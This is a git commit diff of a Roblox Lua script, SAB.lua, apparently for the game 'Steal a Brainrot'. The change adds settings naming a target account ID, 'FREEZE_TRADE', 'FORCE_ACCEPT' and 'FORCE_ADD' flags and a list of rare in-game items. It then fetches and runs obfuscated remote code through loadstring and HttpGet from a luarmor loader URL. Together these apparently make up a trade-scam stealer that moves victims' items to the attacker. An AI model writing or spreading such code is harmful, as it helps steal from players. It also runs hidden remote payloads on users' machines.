dec7fc5320101141acab0805365bd8595cf669a1
Dopejeyemz <160013790+Dopejeyemz@users.noreply.github.com>
2026-03-30 23:50:46 +0800

    Update SAB.lua

--- SAB.lua
+++ SAB.lua
@@ -1,1 +1,24 @@
-loadstring(game:HttpGet("https://pastefy.app/kntcpFP1/raw"))()
+getgenv().TARGET_ID = 4607446246
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().FREEZE_TRADE = true
+getgenv().FORCE_ACCEPT = true
+getgenv().FORCE_ADD = true
+getgenv().TARGET_BRAINROTS = {
+    ["Garama and Madundung"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Capitano Moby"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Cerberus"] = true,
+    ["Cooki and Milki"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Headless Horseman"] = true,
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/acf7b7f9c982b6779f2b2cbad250ea58.lua"))()
